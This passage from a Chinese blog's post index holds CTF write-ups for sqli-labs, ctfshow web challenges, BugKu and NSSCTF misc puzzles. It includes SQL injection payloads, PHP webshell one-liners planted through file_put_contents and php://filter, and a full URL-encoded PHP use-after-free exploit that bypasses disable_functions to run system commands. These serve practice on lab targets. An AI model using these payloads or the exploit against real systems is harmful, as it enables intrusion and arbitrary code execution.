-\n~~~\n\nfloor:\npayload:'union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from \"一个足大的表\" group by x)a\n# less-6\n闭合方式为`\"`，报错注入仍可行。\n# less-7\n文件读写注入，但是我怎么运行文件都不写入，放弃了。\n# less-8\n布尔盲注。\n~~~\n?id=-1'and (ascii(substr(select database()),1,1))==115--+ #判断第一个数据库名字第一个字符的ascii码是否等于115\n?id=1' and (ascii(substr((select database()) ,2,1))) = 101 --+ #判断第一个数据库名字第二个字符的ascii码是否等于101\n?id=1'and (length(database())) = 8 --+ #判断数据库名字的长度是否等于8\n?id=1'and (length(select table_name from information_schema.tables where table_schema='security' limit 3,1)) = 5 --+ #判断地三张表名字的长度是否为5\n?id=1' and (length((select column_name from information_schema.columns where table_name='users' limit 1,1))) = 8 --+ #判断users表里地二个列名的长度是否为8\n~~~\n如果判断正确的话，页面返回正常。\n好麻烦啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊。\n# less-9\n时间盲注\n~~~\nid=1' and if(length(database())>3 ,sleep(5),1) -- - #如果数据库长度长于3的话，延迟5秒返回页面。\n~~~\n[MySQL时间盲注五种延时方法 ](https://www.cnblogs.com/forforever/p/13019703.html)\n# less-10\n还是时间盲注，闭合方式为`\"`。\n# less-11\n![](/pic/sqli/11.png)\n这个就在username上直接输入sql语句就行。\n也可以用hackbar，Post传参。其他语句不变。.\n\n","tags":["sql注入"],"categories":["web"]},{"title":"ctfshow web入门101~104","url":"/2023/02/18/ctfshow-web入门101~104/","content":"# web101\n![](/pic/101.png)\n~~~\n当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过echo显示\n即使传入了空的括号，代码依旧可以运行，且error_reporting(0)的存在阻止了报错\n~~~\nv1必须是数字，v2可以使用可以使用反射类new ReflectionClass(),v3没有过滤`;`。\npayload:\n~~~\nv1=1&v2=echo new Reflectionclass&v3=;\n~~~\n0x2d还是-，然后最后一位需要自己猜。\n# web102\n![](/pic/102.png)\n~~~\nis_numeric() 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true，否则返回false。如果字符串中含有一个e代表科学计数法，也可返回true\n\ncall_user_func() 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数\n\nfile_put_contents() 函数应该都熟悉了，写入内容到文件中，第一个参数是文件名，第二个参数是内容\n~~~\n要确保v4为真，就要确保v2是数字.将v2进行base64编码然后再转换成16进制。\npayload：\n~~~\nv2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=2.php\nPOST：v1=hex2bin\n~~~\n然后访问2.php查看源码就能找到flag。\n# web103\n找不到服务器，做不了题.\n# web104\n![](/pic/104.png)\n因为没有判断，可以直接让两个值相等，也可以用数组绕过，也可以用两个相等的sha1的值。\n~~~\naaK1STfY\n0e76658526655756207688271159624026011393\naaO8zKZF\n0e89257456677279068558073954252716165668\n~~~\n","tags":["ctfshow","刷题","php特性"],"categories":["ctfshow","刷题","php特性"]},{"title":"ctfshow web97~100","url":"/2023/02/07/ctfshow-web入门97~100/","content":"# web97\n![](/pic/97.png)\n要求POST传参，a不能等于b，但是a和b的md5值要相同，但是md5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回NULL。\n~~~\na[]=123&b[]=1234\n~~~\n<!--more-->\n# web98\n![](/pic/98.png)\n~~~\n分析上面的代码可以看出来，只要有输入的get参数就将get方法改变为post方法(修改了get方法\n的地址），而第二三行代码没啥用，我们用不到，直接看第四行，如果get参数HTTP_FLAG的值为\nflag，就读取文件，也就是输出flag。所以思路就有了，我们通过get随便传一个参数并赋值，\n然后我们通过post请求传HTTP_FLAG参数并赋值为flag即可获得flag。\n~~~\n~~~\nGET:?1=1\nPOST:HTTP_FLAG=flag\n~~~\n# web99\n![](/pic/99.png)\n~~~\n array()，是空数组定义，题中定义了$allow为空数组\n0x36d，其十进制为877\nrand()，返回随机整数\narray_push()，是向数组尾部插入新的值\nfile_put_contents()，写文件\n~~~\n因为in_array第三个参数没设置为true，所以该函数是宽松比较（==），字符串型会先转化为整型再比较，只要值相同就可以了，所以我们可以传参写木马进去.\n~~~\n?n=1.php\ncontent=<?php @eval($_POST[1]);?>\n~~~\n然后用蚁剑连接\n# web100\n![](/pic/100.png)\nis_numeric() 函数用于检测变量是否为数字或数字字符串,如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。\nv1一定要是个数字，v2不能有分号，v3必须有分号。\n~~~\nget:/?v1=1&v2=eval($_POST[1])?> %23&v3=;\npost:1=system(\"tac ctfshow.php\");\n~~~\n~~~\n$flag_is_3110c36f0x2df28a0x2d4b840x2dbe0f0x2d2c4f600a4b95;\n~~~\n0x2d是-，换上后加上ctfshow{}就可以了","tags":["ctfshow","刷题","php特性"],"categories":["ctfshow","刷题","php特性"]},{"title":"ctfshow web89~96","url":"/2023/02/02/89/","content":"# web89\n![](/pic/89.png)\n用数组绕过就行。\npayload:\n~~~\n?num[]=a;\n~~~\n<!--more-->\n# web90\n![](/pic/90.png)\n~~~\nintval( mixed $var[, int $base = 10] ) : int\n\nvar\n要转换成 integer 的数量值\nbase\n转化所使用的进制 \nNote: \n如果 base 是 0，通过检测 var 的格式来决定使用的进制： \n◦ 如果字符串包括了 \"0x\" (或 \"0X\") 的前缀，使用 16 进制 (hex)；否则，  \n◦ 如果字符串以 \"0\" 开始，使用 8 进制(octal)；否则，  \n◦ 将使用 10 进制 (decimal)。 \n~~~\n只需要提交0x117c就行，0x117c是16进制的4476，也可以提交4476+字符。\npayload:\n~~~\n?num=0x117c\n?num=4476a\n~~~\n# web91\n![](/pic/91.png)\n第一次是/im第二次是/i\n/im可以匹配多行，/i只能匹配一行。\n所以让他第一次匹配到php第二次匹配不到php。\npayload:\n~~~\n?cmd=1%0aphp\n~~~\n# web92\n![](/pic/92.png)\n可以换个进制绕过\n~~~\n?num=0x117c\n~~~\n或者还有e这个东西\n~~~\nintval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以\n~~~\n\n~~~\n?num=4476e123\n~~~\n# web93\n![](/pic/93.png)\n可以用小数，也可以用8进制\npayload:\n~~~\n?num=4476.1\n?num=010574\n~~~\n~~~\n二进制0bxxx\n八进制0xxxxxx\n十六进制0xaaaa\n~~~\n# web94\n![](/pic/94.png)\nstrpos是匹配字符，必须要匹配到0而且还不能在第一位，可以用8进制也可以用小数。\n如果用8进制的话必须在开头加一个空格。\npayload:\n~~~\n?num=4476.0\n/?num= 010574\n~~~\n# web95\n![](/pic/95.png)\n这一道题多过滤了一个点，所以没法用小数了，其他的跟上一道题一样。\npayload:\n~~~\n?num= 010574\n~~~\n# web96\n![](/pic/96.png)\n想办法读取flag.php还不能直接传flag.php，利用路径或者php协议就行。\npayload:\n~~~\n?u=/var/www/html/flag.php\n?u=./flag.php\n?u=php://filter/resource=falg.php\n~~~","tags":["ctfshow","刷题","php特性"],"categories":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门87~88","url":"/2023/01/31/ctfshow-web入门87/","content":"# web87\n![](/pic/87.png)\n[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list)\n<!--more-->\n~~~\n将 php://filter/write=convert.base64-decode/resource=123.php （这里因为我们需要的是写入的权限，所以是write）进行两次url编码，得到如下\n\n%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%33%32%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30\n~~~\n然后再content写入经过base64编码过后的一句话 （PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==）\n这里content的值前面要加两个字符，因为base64算法解码时是4个byte一组，所以给他增加2个字符 一共8个字符\n![](/pic/87.1.png)\n![](/pic/87.2.png)\n然后再查看fl0g.php就行了\n# web88\n![](/pic/88.png)\n过滤的东西很多，但data协议还可以用。\n~~~\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgKi5waHAiKTs/Pg\n~~~\nbase64后面是base64编码但是不能带有加号和等号，有加号的payload不能用。\n# web116和web117\n不会做.....","tags":["ctfshow","刷题","文件包含"],"categories":["ctfshow","刷题","文件包含"]},{"title":"BugKu刷题","url":"/2023/01/28/BugKu刷题/","content":"# 聪明的小羊\n题目描述：一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}\n栅栏密码，分两栏时就是flag。\n<!--more-->\nflag:`flag{6fde4163df05d900}`\n# /.-\n题目描述： ..-./.-../.-/--./----.--/-../...--/..-./-.-./-.../..-./.----/--.../..-./----./...--/----./----./...../-----/....-/-----.-\n很明显的摩斯密码，[在线摩斯密码翻译](https://www.lddgo.net/encrypt/morse)，可以解出flag：FLAG%u7bD3FCBF17F9399504%u7d\n%u7b是{，%u7d是}，然后字母全部改为小写就是flag。\nflag:`flag{d3fcbf17f9399504}`\n# ok\n题目是okk编码，用[](https://www.splitbrain.org/services/ook)可以直接获得flag。\nflag：`flag{0a394df55312c51a}`\n# linux\n下载文件解压，用记事本的形式打开文件，ctrl+搜索key就能找到flag。\nflag:`key{feb81d3834e2423c9903f4755464060b}`\n# 闪的好快\n下载是一个gif图，用stegsolve打开，一帧一帧扫二维码，然后拼接起来就是flag。\nflag：`SYC{F1aSh_so_f4sT}`\n#  隐写2\n图片的大小感觉和他本身有点不符，用binwalk一看，确实有隐藏的文件。\n分离之后是一个压缩包和一个提示，提示说明解压密码是三位数字。\n暴力破解一下，密码是871，解压之后又是一个图片，用记事本打开，末尾有`f1@g{eTB1IEFyZSBhIGhAY2tlciE=}`\nbase64解码得到falg。\nflag：`f1@g{y0u Are a h@cker!}`\n# 白哥的鸽子\n用stegsolve打开，fileformat最下面有类似于flag的文字。[栅栏密码在线加密解密](http://moersima.00cha.net/shanlan.asp)栅栏加密，\n当栅栏数为3时，就是flag。\nflag：`flag{w22_is_v3ry_cool}`\n# 再也没有纯白的灵魂\n文件开头是~呜嗷开头的，查过之后才发现是兽音密文[](https://roar.iiilab.com/)。由于不知道怎么加密的，就先将flag加密一下试试，然后一一对应，最坑人的是少了一个G，真的恶心人。。。。\n最后解出来就是flag。\nflag：`flag{ni-zhen-shi-shou-ren}`","tags":["刷题","BugKu"],"categories":["BugKu","刷题"]},{"title":"ctfshow web入门69~74","url":"/2023/01/25/ctfshow-web入门69~74/","content":"# web69\n和web68一样。\npayload:\n~~~\nc=include(\"/flag.txt\");\n~~~\n<!--more-->\n# web70\n同上。\n# web71\n![](/pic/71.png)\n~~~\n$s = ob_get_contents();//得到缓冲区的数据。\nob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。可以用exit();停止后面的程序。\n~~~\npayload:\n~~~\nc=include(\"/flag.txt\");exit();\n~~~\n# web72\n![](/pic/72.png)\n这道题过滤了数字和字母，不会一点不会。\n参考一下大佬的wp\n[](https://rolemee.com/2021/07/16/ctfshow-web-ru-men-ming-ling-zhi-xing-72-rao-guo-disable-function-xian-zhi-he-open-basedir-xian-zhi/)\n将\n~~~\nc=?><?php\n$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n}\nexit(0);\n?>\n~~~\n进行`url编码`。\n~~~\nc=?%3E%3C?php%0A$a=new%20DirectoryIterator(%22glob:///*%22);%0Aforeach($a%20as%20$f)%0A%7Becho($f-%3E__toString().'%20');%0A%7D%0Aexit(0);%0A?%3E\n~~~\n![](/pic/72.png)\n看到了`flag0.txt`,但是直接include的话没有权限。\n要用什么uaf绕过\npayload:\n~~~\nc=function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B'args'%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20'WIN'))%20%7B%0A%20%20%20%20%20%20%20%20die('This%20PoC%20is%20for%20*nix%20systems%20only.')%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%0A%20%20%20%20trigger_uaf('x')%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B'args'%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E\n~~~\n得到flag\n# web73\n![](/pic/73.png)\nglob遍历目录，涨知识了。\n~~~\nc=?><?php\n\t$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n}\nexit(0);\n?>\n~~~\n要进行url编码\n![](/pic/73.png)\n发现了`flagc.txt`\npayload:\n~~~\nc=include(\"/flagc.txt\");exit();\n~~~\n\n# web74\n还是同样的步骤，glob遍历目录\nflag在flagx.txt里\npayload：\n~~~\nc=include(\"/flagx.txt\");exit();\n~~~","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]},{"title":"NSSCTF MISC刷题","url":"/2023/01/24/NSSCTF-MISC刷题/","content":"# [SWPUCTF 2021 新生赛]我的银行卡密码\n![](/pic/我的银行卡密码.png)\n压缩包有密码，而且是6位数。用ARCHPR破解，密码是`768521`。\n<!--more-->\n解压之后是一个md文件\n![](/pic/pwd.png)\n直接就懵了，看别人的wp后发现是用手机的九宫格解密的，还是写的少，涨知识了。\n解出来之后是`YLOPJOGJVOCCYNMZYPGXGPOGJDVIGATBASH`\n后面的`ATBASH`就是提示\n将`YLOPJOGJVOCCYNMZYPGXGPOGJDVIG`进行ATBASH解密，得到`BOLKQLTQELXXBMNABKTCTKLTQWERT`，后面的`QWERT`就是QWERT加密，也是个提示。\n将`BOLKQLTQELXXBMNABKTCTKLT`进行QWERT解密，得到`XISRASEACSUUXZYKXREVERSE`,后面的reverse还是个提示得到`XKYZXUUSCAESARSIX`,caesar six也是个提示凯撒密码6，得到`RESTROOM`，最后在RESERVE一下`NSSCTF{moortser}`就是flag。\n# [SWPU 2019]漂流记的马里奥\n点开exe文件出现一个1.txt\n![](/pic/maliao.png)\n提示是ntfs，可以用`NtfsStreamsEditor2`\n或者\n膜拜xenny大佬\ncmd转到文件地址，命令行notepad 1.txt:flag.txt\n最后的flag是`NSSCTF{ddg_is_cute}`\n# [SWPUCTF 2021 新生赛]gif好像有点大\n下载文件后是个GIF图，用`STEG SOLVE`打开，在第562帧的时候有一个二维码，扫码就是flag `NSSCTF{The_G1F_ls_T00_b1g}`\n# [HUBUCTF 2022 新生赛]最简单的misc\n用`stegsolve`打开，LSB隐写，得到一个二维码，然后扫码之后就是flag:`NSSCTF{aacc4238460996f0178c18d7637c9dd5}`\n\n\n\n\n唉！misc题写的恶心，就是跟作者对脑电波嘛。","tags":["刷题","MISC","NSSCTF"],"categories":["MISC","NSSCTF","刷题"]},{"title":"ctfshow web入门57~68","url":"/2023/01/22/ctfshow-web入门57/","content":"# 